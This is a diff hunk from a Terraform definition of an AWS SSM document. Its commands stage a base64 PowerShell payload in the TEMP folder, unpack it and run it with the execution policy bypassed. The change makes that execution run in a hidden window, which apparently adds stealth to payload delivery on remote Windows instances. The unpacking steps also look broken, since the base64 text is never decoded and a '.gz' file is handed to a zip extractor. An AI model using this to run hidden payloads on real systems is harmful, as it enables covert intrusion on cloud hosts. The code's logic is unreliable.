@@ -53,7 +53,7 @@ resource "aws_ssm_document" "this" {
                         "Add-Content -Path \"$env:TEMP\\payload_${var.tag}.txt\" -Value '${var.base64_powershell_payload}'",
                         "Get-Content \"$env:TEMP\\payload_${var.tag}.txt\" | Out-File -FilePath \"$env:TEMP\\payload_${var.tag}.gz\" -Encoding ASCII",
                         "Expand-Archive -Path \"$env:TEMP\\payload_${var.tag}.gz\" -DestinationPath \"$env:TEMP\" -Force",
-                        "powershell.exe -ExecutionPolicy Bypass -File \"$env:TEMP\\payload_${var.tag}.ps1\""
+                        "Start-Process powershell.exe -ArgumentList '-ExecutionPolicy Bypass -File \"$env:TEMP\\payload_${var.tag}.ps1\"' -NoNewWindow -WindowStyle Hidden"
                     ]
                 }
             }
